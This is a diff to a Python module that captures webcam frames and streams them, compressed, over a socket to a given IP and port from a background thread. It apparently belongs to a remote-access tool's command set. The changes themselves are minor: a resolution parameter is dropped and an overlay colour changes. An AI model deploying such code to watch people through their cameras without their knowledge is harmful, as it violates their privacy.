@@ -10,7 +10,7 @@ from foreign.global_state import *
 
 
 @crash_exception_handling
-def cam_action(ip, port, resolution, monitor, fps):
+def cam_action(ip, port, monitor, fps):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
 
@@ -36,11 +36,9 @@ def cam_action(ip, port, resolution, monitor, fps):
 
       if not check:
         raise Exception('No cam')
-      
-      cv2.resize(frame, resolution)
 
       if fps:
-        cv2.putText(frame, f'{1.0 / (time.time() - last_time):.2f}', (10, 25), cv2.FONT_HERSHEY_SIMPLEX, 0.8, (255, 255, 255), 2)
+        cv2.putText(frame, f'{1.0 / (time.time() - last_time):.2f}', (10, 25), cv2.FONT_HERSHEY_SIMPLEX, 0.8, (0, 0, 0), 2)
 
       frame = pickle.dumps(frame)
       frame = zlib.compress(frame, 9)
@@ -52,6 +50,6 @@ def cam_action(ip, port, resolution, monitor, fps):
       mode = [True, 0, b'']
 
 
-def cam(ip, port, resolution, monitor, fps):
-  threading.Thread(target=cam_action, args=(ip, port, resolution, monitor, fps), daemon=True).start()
+def cam(ip, port, monitor, fps):
+  threading.Thread(target=cam_action, args=(ip, port, monitor, fps), daemon=True).start()
   return {'message': 'Cam thread started', 'text_mode': 'primary', 'text_extras': {'point': True}}
